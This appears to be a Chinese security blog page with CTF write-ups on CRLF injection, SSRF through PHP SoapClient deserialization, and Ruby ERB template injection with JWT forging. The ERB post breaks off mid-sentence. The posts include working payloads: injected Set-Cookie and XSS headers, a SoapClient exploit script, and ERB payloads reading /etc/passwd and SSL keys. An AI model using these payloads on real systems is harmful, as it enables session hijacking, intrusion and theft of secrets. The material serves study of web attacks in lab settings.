        <h1 id="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"><a href="#CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF"></a>CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF</h1><h2 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CRLF是“回车+换行(\r\n)”的简称，在http协议中，httpheader和httpbody是用两个CRLF分隔的，浏览器是根据这两个CRLF来取出http内容并显示出来的，所以如果我们可以控制http消息头的字符，注入一些恶意的换行，这样可以注入一些会话Cookie或HTML代码，所以CRLF injection也叫HTTPReaponseSplitting，简称HRS</p>
<h4 id="CRLF注入产生的会话固定漏洞"><a href="#CRLF注入产生的会话固定漏洞" class="headerlink" title="CRLF注入产生的会话固定漏洞"></a>CRLF注入产生的会话固定漏洞</h4><p>当我们可以控制httpheader中的location字段时，我们可以就可以给访问者设置一个SESSION</p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 </span><br><span class="line">Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line">Content- Type: text/html</span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close</span><br><span class="line">Location:http://www.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>然后当我们输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sina.com.cn%0d%0aSet-cookie:JSPSESSID%3Dwooyun</span><br></pre></td></tr></table></figure>

<p>此时我们就设置了一个SESSION，造成会话固定漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT</span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 154 </span><br><span class="line">Connection: close </span><br><span class="line">Location: http://www.sina.com.cn</span><br><span class="line">Set-cookie: JSPSESSID=wooyun</span><br></pre></td></tr></table></figure>
<h4 id="CRLF注入造成无视浏览器Filter反射型XSS"><a href="#CRLF注入造成无视浏览器Filter反射型XSS" class="headerlink" title="CRLF注入造成无视浏览器Filter反射型XSS"></a>CRLF注入造成无视浏览器Filter反射型XSS</h4><p>实例</p>
<p>当一个网站接受url参数<a target="_blank" rel="noopener" href="http://ip/?url=xxx%EF%BC%8Cxxx%E6%94%BE%E5%9C%A8location%E5%90%8E%E9%9D%A2%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E8%B7%B3%E8%BD%AC%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5">http://ip/?url=xxx，xxx放在location后面作为一个跳转，所以我们可以输入</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.sina.com.cn/?url=%0d%0a%0d%0a&lt;imgsrc=1onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>则我们的返回包为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMT Content-Type: text/html Content-Length: 154 Connection: close Location: </span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
<p>之前说的浏览器会根据两个CRLF把HTTP包分成头和体，然后将体显示出来，所以这里这个标签会显示出来，，造成xss</p>
<p>对于无视filter，只有数据包中http头中含有X-XSS-Protection并且为0时，浏览器才不会开启filter，所以我们可以利用一个CRLF将X-XSS-Protection: 0注入到数据包中，再用两个CRLF来注入xss代码，这样就可以绕过filter</p>
<p>而对于Location的注入只有webkit内核浏览器可以使用，其它浏览器可能会跳转</p>
<h2 id="SOAP漏洞利用之CRLF与SSRF"><a href="#SOAP漏洞利用之CRLF与SSRF" class="headerlink" title="SOAP漏洞利用之CRLF与SSRF"></a>SOAP漏洞利用之CRLF与SSRF</h2><p>每种开发语言都有自己的webservice实现框架，php也有，php的SOAP扩展是可以提供和使用webservices，这个扩展实现六个类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高级类：SoapClient、SoapServer、SoapFault</span><br><span class="line"></span><br><span class="line">低级类：SoapHeader、SoapParam 和 SoapVar</span><br></pre></td></tr></table></figure>

<p>SoapClient语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br></pre></td></tr></table></figure>

<p>由于SoapClinet类中的一个$options选项功能有这样一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The user_agent option specifies string to use in User-Agent header</span><br></pre></td></tr></table></figure>
<p>可见这个类可以让我们自定义user-agent，而httpheader有一个重要的content-type和content-length字段，可以控制发送的方式以及内容的长度，而user-agent在它们的上面，所以可以进行覆盖</p>
<p>因此我们可以利用CRLF来构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = new SoapClient(null,array(&#x27;user_agent&#x27;=&gt;&quot;testrnCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32rnContent-Type: application/x-www-form-urlencodedrnContent-Length:45rnrnusername=admin&amp;password=nu1ladmin&amp;code=470837rnrnrn&quot;,&#x27;location&#x27;=&gt;$location,</span><br><span class="line">&#x27;uri&#x27;=&gt;$uri));</span><br></pre></td></tr></table></figure>
<p>这个攻击的作用是从外网调用到soap的api来攻击内网，因此可以说是ssrf攻击</p>
<p>而这个攻击一般是利用SoapClient类中的魔术方法__call()触发的，猜测是触发__call()魔术方法发包</p>
<h2 id="实例（bestphp’s-revenge）"><a href="#实例（bestphp’s-revenge）" class="headerlink" title="实例（bestphp’s revenge）"></a>实例（bestphp’s revenge）</h2><p>打开页面，审计源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>由于call_user_func()函数限制了一些函数，eval()函数在其中，而构造/flag.php，又得到一部分源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>可见我们要本地访问/flag.php才可以读取flag，所以我们可以利用SoapClient类来ssrf，首先我们需要利用反序列化来控制SoapClient类中的变量，所以我们可以利用序列化引擎和反序列化引擎的不同，导致无法正常反序列化，从而伪造数据</p>
<p>所以我们可以利用第一个call_user_func来构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_start([&#x27;serialize_handler&#x27;=&gt;&#x27;php_serialize&#x27;])</span><br></pre></td></tr></table></figure>
<p>来让序列化和反序列化的引擎不同，然后再通过将序列化数据赋值给$_SESSION[“name”]，让它将数据存储到文件时再进行序列化，并进行变量覆盖，然后取出文件，放进内存时进行反序列化，而由于我们设置的序列化和反序列化的引擎不同，所以当反序列化时会将”|“前面的值当成是键名，从而可以触发漏洞，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">$attack = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;123&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo $payload;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以我们可以先构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=session_start&amp;name=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>

<p>然后我们再构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?f=extract&amp;name=SoapClient</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure>
<p>通过extract函数来对$b变量进行覆盖，然后再通过调用SoapClient类中不存在的welcome_to_the_lctf2018函数来触发__call()魔术方法，从而将flag赋值给$_SESSION[“flag”]</p>
<p>最后用刚刚构造的PHPSESSID值来读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</span><br></pre></td></tr></table></figure>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1515276]">https://cloud.tencent.com/developer/article/1515276]</a></p>
<pre><code>[https://www.anquanke.com/post/id/153065#h2-1]

[https://www.jianshu.com/p/d4c304dbd0af]

[https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ruby ERB模板注入以及jwt伪造" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/" class="article-date">
  	<time datetime="2021-10-16T16:00:00.000Z" itemprop="datePublished">2021-10-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/17/ruby%20ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ajwt%E4%BC%AA%E9%80%A0/">
        ruby ERB模板注入以及jwt伪造
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ruby-ERB模板注入以及jwt伪造"><a href="#ruby-ERB模板注入以及jwt伪造" class="headerlink" title="ruby ERB模板注入以及jwt伪造"></a>ruby ERB模板注入以及jwt伪造</h1><p>打开页面后，发现有一个buy flag，但是钱不够，所以我们尝试抓包</p>
<p>发现Cookie字段有一个jwt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJlMWFjYmQ3OC01OTNlLTQ4NzYtOTNhZi00ZWNhYmRkZmYyMDQiLCJqa2wiOjIwfQ.1uVjLWKyyci-TEaw7kxUi9vuGvYDgZ1IF3UuvcIcJtU</span><br></pre></td></tr></table></figure>
<p>打开jwt.io网页，进行解码</p>
<p>HEADER</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;uid&quot;: &quot;e1acbd78-593e-4876-93af-4ecabddff204&quot;,</span><br><span class="line">  &quot;jkl&quot;: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>密钥部分不知道，但是我们可以尝试将PAYLOAD中的jkl改为1000000000000000000000000000，来伪造价格，但是密钥不知道，这里爆破的话有点麻烦，但是我们通过目录的扫描，发现robots.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /filebak</span><br></pre></td></tr></table></figure>
<p>所以访问/filebak，得到ruby语言的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>我们可以查看jwt加密和解密那部分代码</p>
<p>加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>看代码可知，jwt密钥部分是用HS256加密的，口令为ENV[“SECRET”]，所以我们需要想办法知道ENV[“SECRET”]，所以我们可以查看解密的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
<p>我们可以从</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>中的alert()函数，判断它可能是Ruby ERB模板注入</p>
<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>对与Ruby ERB模板注入来说，&lt;%=是用来执行ruby语句的，会将结果转换为字符串，所以我们可以尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=7*7%&gt;</span><br></pre></td></tr></table></figure>
<p>来查看它是否存在ruby erb模板注入，如果存在的话，我们可以使用自带的全局函数来测试是否执行函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>
<p>如果不可以成功的话，可能是因为Ruby的ERB模板引擎包含一个安全级别参数，当安全级别设置为0以上的某个值（如：3）时，我们将无法在模板绑定中执行包括文件操作在内的某些函数，如果设置为4，则只可以执行标记为可信状态的那些代码，所以此时我们可以尝试枚举该对象的可用属性以及方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self %&gt;</span><br></pre></td></tr></table></figure>



<p>然后可以尝试获取self对象的类名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.class.name %&gt;</span><br></pre></td></tr></table></figure>



<p>得到类名后，我们可以尝试枚举类的可用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= self.methods %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以将数据传递给这些函数，以达到未授权访问的目的，虽然我们不清楚使用的web框架，但是我们要向服务器发送HTTP POST请求，所以我们可以使用handlePOST或doPOST函数内部，来借此访问某些局部变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.method(:handle_POST).parameters %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见3个req参数，该参数可能代表的是某个请求对象，rsp参数可能代表的是响应数据的引用，最后session参数可能是某个id或某个对象，所以我们可以查看session对象的具体含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=session.class.name %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见WEBrick是Ruby在标准库中实现的原生web服务器，我们还可以探索其它有用的信息</p>
<p>我们可以使用某些内省方法来确认我们是否可以访问这些变量以及其它可用变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>当WEBrick被实例化以处理客户端请求时，它会将某个http服务器实例传递给servlet，这很有可能是@server这个实例变量，所以我们可以调用.instance_variables方法来观察这个对象包含哪些成员变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=@server.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见@ssl_context变量，这个变量可能会包含某些密钥或其它有用信息，所以我们可以改变一下语法来创建自己的局部变量，保存@sll_context的引用，使载荷可读性更好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>此时我们可以看见有@key，所以我们可以提取出这个变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure>
<p>回到题目本身，我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=7*7 %&gt;&amp;do=&lt;%=7*7 %&gt;%20is%20working</span><br></pre></td></tr></table></figure>
<p>进行测试，发现不可以执行，猜测是因为安全等级的原因，但是可以查看预定义变量，由于前面有进行匹配的操作，且进行匹配的代码是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用$’预定义变量来进行模板注入，从而读取ENV[“SCERET”]的值，而首先进行的匹配是</p>
